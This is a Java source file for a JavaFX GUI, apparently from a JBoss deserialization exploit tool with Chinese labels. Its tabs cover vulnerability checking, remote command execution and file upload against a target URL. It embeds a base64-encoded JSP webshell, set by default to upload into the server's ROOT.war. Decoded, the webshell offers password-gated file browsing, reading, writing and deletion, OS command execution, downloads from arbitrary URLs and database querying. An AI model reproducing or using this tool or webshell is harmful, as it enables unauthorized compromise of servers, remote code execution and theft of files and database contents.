package serializeTools.Frame;


import com.sun.xml.internal.messaging.saaj.util.Base64;

import javafx.application.Application;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.ComboBox;
import javafx.scene.control.Label;
import javafx.scene.control.Tab;
import javafx.scene.control.TabPane;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.layout.HBox;
import javafx.scene.layout.Priority;
import javafx.scene.layout.VBox;
import javafx.stage.Stage;
import serializeTools.exploit.jboss.CheckVul;
import serializeTools.exploit.jboss.ExecCommand;
import serializeTools.exploit.jboss.UploadFile;

public class MainFrame extends Application
{
	TextField targetTextField = null;
	ComboBox<String> encodingComboBox = null;
	String encoding = new String();
	private String shell = "PCVAcGFnZSBpbXBvcnQ9ImphdmEuaW8uKixqYXZhLnV0aWwuKixqYXZhLm5ldC4qLGphdmEuc3FsLiosamF2YS50ZXh0LioiJT48JSFTdHJpbmcgUHdkPSJ4eHh4eHgiO1N0cmluZyBjcz0iVVRGLTgiO1N0cmluZyBFQyhTdHJpbmcgcyl0aHJvd3MgRXhjZXB0aW9ue3JldHVybiBuZXcgU3RyaW5nKHMuZ2V0Qnl0ZXMoIklTTy04ODU5LTEiKSxjcyk7fUNvbm5lY3Rpb24gR0MoU3RyaW5nIHMpdGhyb3dzIEV4Y2VwdGlvbntTdHJpbmdbXSB4PXMudHJpbSgpLnNwbGl0KCJcclxuIik7Q2xhc3MuZm9yTmFtZSh4WzBdLnRyaW0oKSk7aWYoeFsxXS5pbmRleE9mKCJqZGJjOm9yYWNsZSIpIT0tMSl7cmV0dXJuIERyaXZlck1hbmFnZXIuZ2V0Q29ubmVjdGlvbih4WzFdLnRyaW0oKSsiOiIreFs0XSx4WzJdLmVxdWFsc0lnbm9yZUNhc2UoIlsvbnVsbF0iKT8iIjp4WzJdLHhbM10uZXF1YWxzSWdub3JlQ2FzZSgiWy9udWxsXSIpPyIiOnhbM10pO31lbHNle0Nvbm5lY3Rpb24gYz1Ecml2ZXJNYW5hZ2VyLmdldENvbm5lY3Rpb24oeFsxXS50cmltKCkseFsyXS5lcXVhbHNJZ25vcmVDYXNlKCJbL251bGxdIik/IiI6eFsyXSx4WzNdLmVxdWFsc0lnbm9yZUNhc2UoIlsvbnVsbF0iKT8iIjp4WzNdKTtpZih4Lmxlbmd0aD40KXtjLnNldENhdGFsb2coeFs0XSk7fXJldHVybiBjO319dm9pZCBBQShTdHJpbmdCdWZmZXIgc2IpdGhyb3dzIEV4Y2VwdGlvbntGaWxlIHJbXT1GaWxlLmxpc3RSb290cygpO2ZvcihpbnQgaT0wO2k8ci5sZW5ndGg7aSsrKXtzYi5hcHBlbmQocltpXS50b1N0cmluZygpLnN1YnN0cmluZygwLDIpKTt9fXZvaWQgQkIoU3RyaW5nIHMsU3RyaW5nQnVmZmVyIHNiKXRocm93cyBFeGNlcHRpb257RmlsZSBvRj1uZXcgRmlsZShzKSxsW109b0YubGlzdEZpbGVzKCk7U3RyaW5nIHNULHNRLHNGPSIiO2phdmEudXRpbC5EYXRlIGR0O1NpbXBsZURhdGVGb3JtYXQgZm09bmV3IFNpbXBsZURhdGVGb3JtYXQoInl5eXktTU0tZGQgSEg6bW06c3MiKTtmb3IoaW50IGk9MDsgaTxsLmxlbmd0aDsgaSsrKXtkdD1uZXcgamF2YS51dGlsLkRhdGUobFtpXS5sYXN0TW9kaWZpZWQoKSk7c1Q9Zm0uZm9ybWF0KGR0KTtzUT1sW2ldLmNhblJlYWQoKT8iUiI6IiI7c1EgKz1sW2ldLmNhbldyaXRlKCk/IiBXIjoiIjtpZihsW2ldLmlzRGlyZWN0b3J5KCkpe3NiLmFwcGVuZChsW2ldLmdldE5hbWUoKSsiL1x0IitzVCsiXHQiK2xbaV0ubGVuZ3RoKCkrIlx0IitzUSsiXG4iKTt9ZWxzZXtzRis9bFtpXS5nZXROYW1lKCkrIlx0IitzVCsiXHQiK2xbaV0ubGVuZ3RoKCkrIlx0IitzUSsiXG4iO319c2IuYXBwZW5kKHNGKTt9dm9pZCBFRShTdHJpbmcgcyl0aHJvd3MgRXhjZXB0aW9ue0ZpbGUgZj1uZXcgRmlsZShzKTtpZihmLmlzRGlyZWN0b3J5KCkpe0ZpbGUgeFtdPWYubGlzdEZpbGVzKCk7Zm9yKGludCBrPTA7IGsgPCB4Lmxlbmd0aDsgaysrKXtpZigheFtrXS5kZWxldGUoKSl7RUUoeFtrXS5nZXRQYXRoKCkpO319fWYuZGVsZXRlKCk7fXZvaWQgRkYoU3RyaW5nIHMsSHR0cFNlcnZsZXRSZXNwb25zZSByKXRocm93cyBFeGNlcHRpb257aW50IG47Ynl0ZVtdIGI9bmV3IGJ5dGVbNTEyXTtyLnJlc2V0KCk7U2VydmxldE91dHB1dFN0cmVhbSBvcz1yLmdldE91dHB1dFN0cmVhbSgpO0J1ZmZlcmVkSW5wdXRTdHJlYW0gaXM9bmV3IEJ1ZmZlcmVkSW5wdXRTdHJlYW0obmV3IEZpbGVJbnB1dFN0cmVhbShzKSk7b3Mud3JpdGUoKCItPiIrInwiKS5nZXRCeXRlcygpLDAsMyk7d2hpbGUoKG49aXMucmVhZChiLDAsNTEyKSkhPS0xKXtvcy53cml0ZShiLDAsbik7fW9zLndyaXRlKCgifCIrIjwtIikuZ2V0Qnl0ZXMoKSwwLDMpO29zLmNsb3NlKCk7aXMuY2xvc2UoKTt9dm9pZCBHRyhTdHJpbmcgcyxTdHJpbmcgZCl0aHJvd3MgRXhjZXB0aW9ue1N0cmluZyBoPSIwMTIzNDU2Nzg5QUJDREVGIjtGaWxlIGY9bmV3IEZpbGUocyk7Zi5jcmVhdGVOZXdGaWxlKCk7RmlsZU91dHB1dFN0cmVhbSBvcz1uZXcgRmlsZU91dHB1dFN0cmVhbShmKTtmb3IoaW50IGk9MDsgaTxkLmxlbmd0aCgpO2krPTIpe29zLndyaXRlKChoLmluZGV4T2YoZC5jaGFyQXQoaSkpIDw8IDQgfCBoLmluZGV4T2YoZC5jaGFyQXQoaSsxKSkpKTt9b3MuY2xvc2UoKTt9dm9pZCBISChTdHJpbmcgcyxTdHJpbmcgZCl0aHJvd3MgRXhjZXB0aW9ue0ZpbGUgc2Y9bmV3IEZpbGUocyksZGY9bmV3IEZpbGUoZCk7aWYoc2YuaXNEaXJlY3RvcnkoKSl7aWYoIWRmLmV4aXN0cygpKXtkZi5ta2RpcigpO31GaWxlIHpbXT1zZi5saXN0RmlsZXMoKTtmb3IoaW50IGo9MDsgajx6Lmxlbmd0aDsgaisrKXtISChzKyIvIit6W2pdLmdldE5hbWUoKSxkKyIvIit6W2pdLmdldE5hbWUoKSk7fX1lbHNle0ZpbGVJbnB1dFN0cmVhbSBpcz1uZXcgRmlsZUlucHV0U3RyZWFtKHNmKTtGaWxlT3V0cHV0U3RyZWFtIG9zPW5ldyBGaWxlT3V0cHV0U3RyZWFtKGRmKTtpbnQgbjtieXRlW10gYj1uZXcgYnl0ZVs1MTJdO3doaWxlKChuPWlzLnJlYWQoYiwwLDUxMikpIT0tMSl7b3Mud3JpdGUoYiwwLG4pO31pcy5jbG9zZSgpO29zLmNsb3NlKCk7fX12b2lkIElJKFN0cmluZyBzLFN0cmluZyBkKXRocm93cyBFeGNlcHRpb257RmlsZSBzZj1uZXcgRmlsZShzKSxkZj1uZXcgRmlsZShkKTtzZi5yZW5hbWVUbyhkZik7fXZvaWQgSkooU3RyaW5nIHMpdGhyb3dzIEV4Y2VwdGlvbntGaWxlIGY9bmV3IEZpbGUocyk7Zi5ta2RpcigpO312b2lkIEtLKFN0cmluZyBzLFN0cmluZyB0KXRocm93cyBFeGNlcHRpb257RmlsZSBmPW5ldyBGaWxlKHMpO1NpbXBsZURhdGVGb3JtYXQgZm09bmV3IFNpbXBsZURhdGVGb3JtYXQoInl5eXktTU0tZGQgSEg6bW06c3MiKTtqYXZhLnV0aWwuRGF0ZSBkdD1mbS5wYXJzZSh0KTtmLnNldExhc3RNb2RpZmllZChkdC5nZXRUaW1lKCkpO312b2lkIExMKFN0cmluZyBzLFN0cmluZyBkKXRocm93cyBFeGNlcHRpb257VVJMIHU9bmV3IFVSTChzKTtpbnQgbj0wO0ZpbGVPdXRwdXRTdHJlYW0gb3M9bmV3IEZpbGVPdXRwdXRTdHJlYW0oZCk7SHR0cFVSTENvbm5lY3Rpb24gaD0oSHR0cFVSTENvbm5lY3Rpb24pIHUub3BlbkNvbm5lY3Rpb24oKTtJbnB1dFN0cmVhbSBpcz1oLmdldElucHV0U3RyZWFtKCk7Ynl0ZVtdIGI9bmV3IGJ5dGVbNTEyXTt3aGlsZSgobj1pcy5yZWFkKGIpKSE9LTEpe29zLndyaXRlKGIsMCxuKTt9b3MuY2xvc2UoKTtpcy5jbG9zZSgpO2guZGlzY29ubmVjdCgpO312b2lkIE1NKElucHV0U3RyZWFtIGlzLFN0cmluZ0J1ZmZlciBzYil0aHJvd3MgRXhjZXB0aW9ue1N0cmluZyBsO0J1ZmZlcmVkUmVhZGVyIGJyPW5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIoaXMpKTt3aGlsZSgobD1ici5yZWFkTGluZSgpKSE9bnVsbCl7c2IuYXBwZW5kKGwrIlxyXG4iKTt9fXZvaWQgTk4oU3RyaW5nIHMsU3RyaW5nQnVmZmVyIHNiKXRocm93cyBFeGNlcHRpb257Q29ubmVjdGlvbiBjPUdDKHMpO1Jlc3VsdFNldCByPXMuaW5kZXhPZigiamRiYzpvcmFjbGUiKSE9LTE/Yy5nZXRNZXRhRGF0YSgpLmdldFNjaGVtYXMoKTpjLmdldE1ldGFEYXRhKCkuZ2V0Q2F0YWxvZ3MoKTt3aGlsZShyLm5leHQoKSl7c2IuYXBwZW5kKHIuZ2V0U3RyaW5nKDEpKyJcdCIpO31yLmNsb3NlKCk7Yy5jbG9zZSgpO312b2lkIE9PKFN0cmluZyBzLFN0cmluZ0J1ZmZlciBzYil0aHJvd3MgRXhjZXB0aW9ue0Nvbm5lY3Rpb24gYz1HQyhzKTtTdHJpbmdbXSB4PXMudHJpbSgpLnNwbGl0KCJcclxuIik7UmVzdWx0U2V0IHI9Yy5nZXRNZXRhRGF0YSgpLmdldFRhYmxlcyhudWxsLHMuaW5kZXhPZigiamRiYzpvcmFjbGUiKSE9LTE/eC5sZW5ndGg+NT94WzVdOnhbNF06bnVsbCwiJSIsbmV3IFN0cmluZ1tdeyJUQUJMRSJ9KTt3aGlsZShyLm5leHQoKSl7c2IuYXBwZW5kKHIuZ2V0U3RyaW5nKCJUQUJMRV9OQU1FIikrIlx0Iik7fXIuY2xvc2UoKTtjLmNsb3NlKCk7fXZvaWQgUFAoU3RyaW5nIHMsU3RyaW5nQnVmZmVyIHNiKXRocm93cyBFeGNlcHRpb257U3RyaW5nW10geD1zLnRyaW0oKS5zcGxpdCgiXHJcbiIpO0Nvbm5lY3Rpb24gYz1HQyhzKTtTdGF0ZW1lbnQgbT1jLmNyZWF0ZVN0YXRlbWVudCgxMDA1LDEwMDcpO1Jlc3VsdFNldCByPW0uZXhlY3V0ZVF1ZXJ5KCJzZWxlY3QgKiBmcm9tICIreFt4Lmxlbmd0aC0xXSk7UmVzdWx0U2V0TWV0YURhdGEgZD1yLmdldE1ldGFEYXRhKCk7Zm9yKGludCBpPTE7aTw9ZC5nZXRDb2x1bW5Db3VudCgpO2krKyl7c2IuYXBwZW5kKGQuZ2V0Q29sdW1uTmFtZShpKSsiICgiK2QuZ2V0Q29sdW1uVHlwZU5hbWUoaSkrIilcdCIpO31yLmNsb3NlKCk7bS5jbG9zZSgpO2MuY2xvc2UoKTt9dm9pZCBRUShTdHJpbmcgY3MsU3RyaW5nIHMsU3RyaW5nIHEsU3RyaW5nQnVmZmVyIHNiLFN0cmluZyBwKXRocm93cyBFeGNlcHRpb257Q29ubmVjdGlvbiBjPUdDKHMpO1N0YXRlbWVudCBtPWMuY3JlYXRlU3RhdGVtZW50KDEwMDUsMTAwOCk7QnVmZmVyZWRXcml0ZXIgYnc9bnVsbDt0cnl7UmVzdWx0U2V0IHI9bS5leGVjdXRlUXVlcnkocS5pbmRleE9mKCItLWY6IikhPS0xP3Euc3Vic3RyaW5nKDAscS5pbmRleE9mKCItLWY6IikpOnEpO1Jlc3VsdFNldE1ldGFEYXRhIGQ9ci5nZXRNZXRhRGF0YSgpO2ludCBuPWQuZ2V0Q29sdW1uQ291bnQoKTtmb3IoaW50IGk9MTsgaSA8PW47IGkrKyl7c2IuYXBwZW5kKGQuZ2V0Q29sdW1uTmFtZShpKSsiXHR8XHQiKTt9c2IuYXBwZW5kKCJcclxuIik7aWYocS5pbmRleE9mKCItLWY6IikhPS0xKXtGaWxlIGZpbGU9bmV3IEZpbGUocCk7aWYocS5pbmRleE9mKCItdG86Iik9PS0xKXtmaWxlLm1rZGlyKCk7fWJ3PW5ldyBCdWZmZXJlZFdyaXRlcihuZXcgT3V0cHV0U3RyZWFtV3JpdGVyKG5ldyBGaWxlT3V0cHV0U3RyZWFtKG5ldyBGaWxlKHEuaW5kZXhPZigiLXRvOiIpIT0tMT9wLnRyaW0oKTpwK3Euc3Vic3RyaW5nKHEuaW5kZXhPZigiLS1mOiIpKzQscS5sZW5ndGgoKSkudHJpbSgpKSx0cnVlKSxjcykpO313aGlsZShyLm5leHQoKSl7Zm9yKGludCBpPTE7IGk8PW47aSsrKXtpZihxLmluZGV4T2YoIi0tZjoiKSE9LTEpe2J3LndyaXRlKHIuZ2V0T2JqZWN0KGkpKyIiKyJcdCIpO2J3LmZsdXNoKCk7fWVsc2V7c2IuYXBwZW5kKHIuZ2V0T2JqZWN0KGkpKyIiKyJcdHxcdCIpO319aWYoYnchPW51bGwpe2J3Lm5ld0xpbmUoKTt9c2IuYXBwZW5kKCJcclxuIik7fXIuY2xvc2UoKTtpZihidyE9bnVsbCl7YncuY2xvc2UoKTt9fWNhdGNoKEV4Y2VwdGlvbiBlKXtzYi5hcHBlbmQoIlJlc3VsdFx0fFx0XHJcbiIpO3RyeXttLmV4ZWN1dGVVcGRhdGUocSk7c2IuYXBwZW5kKCJFeGVjdXRlIFN1Y2Nlc3NmdWxseSFcdHxcdFxyXG4iKTt9Y2F0Y2goRXhjZXB0aW9uIGVlKXtzYi5hcHBlbmQoZWUudG9TdHJpbmcoKSsiXHR8XHRcclxuIik7fX1tLmNsb3NlKCk7Yy5jbG9zZSgpO30lPjwlY3M9cmVxdWVzdC5nZXRQYXJhbWV0ZXIoInowIikhPW51bGw/cmVxdWVzdC5nZXRQYXJhbWV0ZXIoInowIikrIiI6Y3M7cmVzcG9uc2Uuc2V0Q29udGVudFR5cGUoInRleHQvaHRtbCIpO3Jlc3BvbnNlLnNldENoYXJhY3RlckVuY29kaW5nKGNzKTtTdHJpbmdCdWZmZXIgc2I9bmV3IFN0cmluZ0J1ZmZlcigiIik7dHJ5e1N0cmluZyBaPUVDKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKFB3ZCkrIiIpO1N0cmluZyB6MT1FQyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiejEiKSsiIik7U3RyaW5nIHoyPUVDKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJ6MiIpKyIiKTtzYi5hcHBlbmQoIi0+IisifCIpO1N0cmluZyBzPXJlcXVlc3QuZ2V0U2Vzc2lvbigpLmdldFNlcnZsZXRDb250ZXh0KCkuZ2V0UmVhbFBhdGgoIi8iKTtpZihaLmVxdWFscygiQSIpKXtzYi5hcHBlbmQocysiXHQiKTtpZighcy5zdWJzdHJpbmcoMCwxKS5lcXVhbHMoIi8iKSl7QUEoc2IpO319ZWxzZSBpZihaLmVxdWFscygiQiIpKXtCQih6MSxzYik7fWVsc2UgaWYoWi5lcXVhbHMoIkMiKSl7U3RyaW5nIGw9IiI7QnVmZmVyZWRSZWFkZXIgYnI9bmV3IEJ1ZmZlcmVkUmVhZGVyKG5ldyBJbnB1dFN0cmVhbVJlYWRlcihuZXcgRmlsZUlucHV0U3RyZWFtKG5ldyBGaWxlKHoxKSkpKTt3aGlsZSgobD1ici5yZWFkTGluZSgpKSE9bnVsbCl7c2IuYXBwZW5kKGwrIlxyXG4iKTt9YnIuY2xvc2UoKTt9ZWxzZSBpZihaLmVxdWFscygiRCIpKXtCdWZmZXJlZFdyaXRlciBidz1uZXcgQnVmZmVyZWRXcml0ZXIobmV3IE91dHB1dFN0cmVhbVdyaXRlcihuZXcgRmlsZU91dHB1dFN0cmVhbShuZXcgRmlsZSh6MSkpKSk7Yncud3JpdGUoejIpO2J3LmNsb3NlKCk7c2IuYXBwZW5kKCIxIik7fWVsc2UgaWYoWi5lcXVhbHMoIkUiKSl7RUUoejEpO3NiLmFwcGVuZCgiMSIpO31lbHNlIGlmKFouZXF1YWxzKCJGIikpe0ZGKHoxLHJlc3BvbnNlKTt9ZWxzZSBpZihaLmVxdWFscygiRyIpKXtHRyh6MSx6Mik7c2IuYXBwZW5kKCIxIik7fWVsc2UgaWYoWi5lcXVhbHMoIkgiKSl7SEgoejEsejIpO3NiLmFwcGVuZCgiMSIpO31lbHNlIGlmKFouZXF1YWxzKCJJIikpe0lJKHoxLHoyKTtzYi5hcHBlbmQoIjEiKTt9ZWxzZSBpZihaLmVxdWFscygiSiIpKXtKSih6MSk7c2IuYXBwZW5kKCIxIik7fWVsc2UgaWYoWi5lcXVhbHMoIksiKSl7S0soejEsejIpO3NiLmFwcGVuZCgiMSIpO31lbHNlIGlmKFouZXF1YWxzKCJMIikpe0xMKHoxLHoyKTtzYi5hcHBlbmQoIjEiKTt9ZWxzZSBpZihaLmVxdWFscygiTSIpKXtTdHJpbmdbXSBjPXt6MS5zdWJzdHJpbmcoMiksejEuc3Vic3RyaW5nKDAsMiksejJ9O1Byb2Nlc3MgcD1SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO01NKHAuZ2V0SW5wdXRTdHJlYW0oKSxzYik7TU0ocC5nZXRFcnJvclN0cmVhbSgpLHNiKTt9ZWxzZSBpZihaLmVxdWFscygiTiIpKXtOTih6MSxzYik7fWVsc2UgaWYoWi5lcXVhbHMoIk8iKSl7T08oejEsc2IpO31lbHNlIGlmKFouZXF1YWxzKCJQIikpe1BQKHoxLHNiKTt9ZWxzZSBpZihaLmVxdWFscygiUSIpKXtRUShjcyx6MSx6MixzYix6Mi5pbmRleE9mKCItdG86IikhPS0xP3oyLnN1YnN0cmluZyh6Mi5pbmRleE9mKCItdG86IikrNCx6Mi5sZW5ndGgoKSk6cy5yZXBsYWNlQWxsKCJcXFxcIiwiLyIpKyJpbWFnZXMvIik7fX1jYXRjaChFeGNlcHRpb24gZSl7c2IuYXBwZW5kKCJFUlJPUiIrIjovLyAiK2UudG9TdHJpbmcoKSk7fXNiLmFwcGVuZCgifCIrIjwtIik7b3V0LnByaW50KHNiLnRvU3RyaW5nKCkpOyU+";
	
	public static void main(String[] args)
	{
		launch(args);
	}

	@Override
	public void start(Stage primaryStage) throws Exception
	{
		// TODO Auto-generated method stub
		VBox vBox = new VBox();
		HBox targetPane = this.setTargetPane();
		TabPane tabPane = this.setTablePane();
		VBox.setVgrow(tabPane, Priority.ALWAYS);
		vBox.getChildren().addAll(targetPane, tabPane);
		vBox.setStyle("-fx-padding: 5;");
		vBox.setSpacing(10.0);

		primaryStage.setTitle("Java反序列化工具");
		primaryStage.setScene(new Scene(vBox, 800, 600));
		primaryStage.show();
	}

	private HBox setTargetPane()
	{
		HBox hBox = new HBox();
		hBox.setMaxSize(Double.MAX_VALUE, Double.MAX_VALUE);
		hBox.setMinSize(Double.MIN_VALUE, Double.MIN_VALUE);
		hBox.setAlignment(Pos.CENTER_LEFT);
		hBox.setSpacing(7.0);
		// hBox.setPadding(new Insets(10.0));

		Label encodingLabel = new Label("编码:");
		ComboBox<String> encodingComboBox = new ComboBox<>();
		encodingComboBox.getItems().addAll("UTF-8", "GB2312");
		encodingComboBox.getSelectionModel().selectFirst();
		encoding = "UTF-8";
		encodingComboBox.valueProperty().addListener(new ChangeListener<String>()
		{
			@Override
			public void changed(ObservableValue<? extends String> observable, String oldValue, String newValue)
			{
				encoding = newValue;
			}
		});

		Label targetLabel = new Label("命令:");
		targetTextField = new TextField();
		targetTextField.setPromptText("在此处填写URL");
		targetTextField.setText("http://192.168.200.201:8080");
		HBox.setHgrow(targetTextField, Priority.ALWAYS);

		hBox.getChildren().addAll(encodingLabel, encodingComboBox, targetLabel, targetTextField);
		return hBox;
	}

	private TabPane setTablePane()
	{
		TabPane tabPane = new TabPane();

		// tabPane.setPadding(new Insets(10.0));
		Tab targetInfoTab = new Tab("信息获取");
		targetInfoTab.setClosable(false);
		targetInfoTab.setContent(setTargetInfoTab());

		Tab commandExecTab = new Tab("命令执行");
		commandExecTab.setClosable(false);
		commandExecTab.setContent(setCommandTab());
		
		Tab fileUploadTab = new Tab("文件上传");
		fileUploadTab.setClosable(false);
		fileUploadTab.setContent(setFileUploadTab());
		// Tab fileManagerTab=new Tab("文件管理");
		tabPane.getTabs().addAll(targetInfoTab, commandExecTab, fileUploadTab);
		return tabPane;
	}

	/*
	 * 获取信息面板
	 */
	private VBox setTargetInfoTab()
	{
		VBox targetBox = new VBox();
		targetBox.setSpacing(10.0);

		HBox hBox = new HBox();
		hBox.setPadding(new Insets(10, 0, 0, 10));
		hBox.setAlignment(Pos.CENTER_LEFT);
		hBox.setSpacing(7.0);
		Button getInfoButton = new Button("获取信息");
		//Button saveButton = new Button("保存信息");
		Button clearButton = new Button("清除信息");
		TextArea infoText = new TextArea();
		infoText.setEditable(false);
		infoText.setWrapText(true);
		infoText.appendText("\r\n");
		getInfoButton.setOnAction(new EventHandler<ActionEvent>()
		{
			@Override
			public void handle(ActionEvent event)
			{
				// TODO Auto-generated method stub
				String targetUrl = targetTextField.getText();
				CheckVul checkVul = new CheckVul();
				String checkVulRes;
				try {
					checkVulRes = checkVul.checkVul(targetUrl, encoding);
			        infoText.setText(checkVulRes);
			        return;
				} catch (Exception e) {
					// TODO Auto-generated catch block
					infoText.setText("500|未知错误");
		            return;
				}
				
			}
		});

		clearButton.setOnAction(new EventHandler<ActionEvent>()
		{
			@Override
			public void handle(ActionEvent event)
			{
				// TODO Auto-generated method stub
				infoText.clear();
			}
		});


		getInfoButton.setPrefWidth(100);
		HBox.setHgrow(getInfoButton, Priority.NEVER);
		clearButton.setPrefWidth(100);
		HBox.setHgrow(clearButton, Priority.NEVER);
		hBox.getChildren().addAll(getInfoButton, clearButton);

		VBox.setVgrow(infoText, Priority.ALWAYS);
		targetBox.getChildren().addAll(hBox, infoText);

		return targetBox;
	}
	
	/*
	 * 命令执行面板
	 */
	private VBox setCommandTab()
	{
		VBox commandBox = new VBox();
		commandBox.setSpacing(10.0);

		HBox hBox = new HBox();
		hBox.setSpacing(7.0);
		hBox.setPadding(new Insets(10, 10, 0, 10));
		hBox.setAlignment(Pos.CENTER_LEFT);
		Label label = new Label("命令:");
		TextField commandField = new TextField();
		commandField.setPromptText("在此处填写命令");
		commandField.setText("whoami");
		HBox.setHgrow(commandField, Priority.ALWAYS);
		Button executeButton = new Button("执行");
		executeButton.setPrefWidth(50);
		Button clearButton = new Button("清楚信息");
		clearButton.setPrefWidth(70);
		hBox.getChildren().addAll(label, commandField, executeButton, clearButton);

		TextArea infoText = new TextArea();
		infoText.setEditable(false);
		infoText.setWrapText(true);
		infoText.appendText("\r\n");
		VBox.setVgrow(infoText, Priority.ALWAYS);
		commandBox.getChildren().addAll(hBox, infoText);
		
		executeButton.setOnAction(new EventHandler<ActionEvent>()
		{

			@Override
			public void handle(ActionEvent event)
			{
				// TODO Auto-generated method stub
				try
				{
					String commands = commandField.getText();
					String targetUrl = targetTextField.getText();
					ExecCommand ec = new ExecCommand();
					String res = ec.execCommand(targetUrl, targetUrl, commands);
					infoText.appendText(res);
					infoText.appendText("============================================================\r\n");
				} catch (Exception e)
				{
					e.printStackTrace();
				}
			}
		});

		clearButton.setOnAction(new EventHandler<ActionEvent>()
		{
			@Override
			public void handle(ActionEvent event)
			{
				// TODO Auto-generated method stub
				infoText.clear();
			}
		});

		return commandBox;
	}
	/*
	 * 文件上传面板
	 */
	private VBox setFileUploadTab()
	{
		VBox fileUploadBox = new VBox();
		fileUploadBox.setSpacing(10.0);

		HBox hBox = new HBox();
		hBox.setSpacing(7.0);
		hBox.setPadding(new Insets(10, 10, 0, 10));
		hBox.setAlignment(Pos.CENTER_LEFT);
		
		Label label = new Label("路径:");
		TextField filePathField = new TextField();
		filePathField.setPromptText("在此处填写上传路径");
		filePathField.setText("../server/default/deploy/ROOT.war/test.jsp");
		HBox.setHgrow(filePathField, Priority.ALWAYS);
		
		Button uploadButton = new Button("上传文件");
		uploadButton.setPrefWidth(70);
		
		Button clearButton = new Button("清空内容");
		clearButton.setPrefWidth(70);
		
		hBox.getChildren().addAll(label, filePathField, uploadButton, clearButton);

		TextArea fileContentText = new TextArea();
		fileContentText.setEditable(true);
		fileContentText.setWrapText(true);
		String sh = Base64.base64Decode(shell);
		fileContentText.setText(sh);
		VBox.setVgrow(fileContentText, Priority.ALWAYS);
		fileUploadBox.getChildren().addAll(hBox, fileContentText);
		
		uploadButton.setOnAction(new EventHandler<ActionEvent>()
		{

			@Override
			public void handle(ActionEvent event)
			{
				// TODO Auto-generated method stub
				try
				{
					String targetUrl = targetTextField.getText();
					String filePath = filePathField.getText();
					byte[] fileContentBytes = fileContentText.getText().getBytes();
					
					String res = UploadFile.getInstance().uploadFile(targetUrl, encoding, filePath, fileContentBytes);
					fileContentText.setText(res);
				} catch (Exception e)
				{
					fileContentText.setText("文件上传失败");
				}
			}
		});

		clearButton.setOnAction(new EventHandler<ActionEvent>()
		{
			@Override
			public void handle(ActionEvent event)
			{
				// TODO Auto-generated method stub
				fileContentText.clear();
			}
		});

		return fileUploadBox;
	}

}
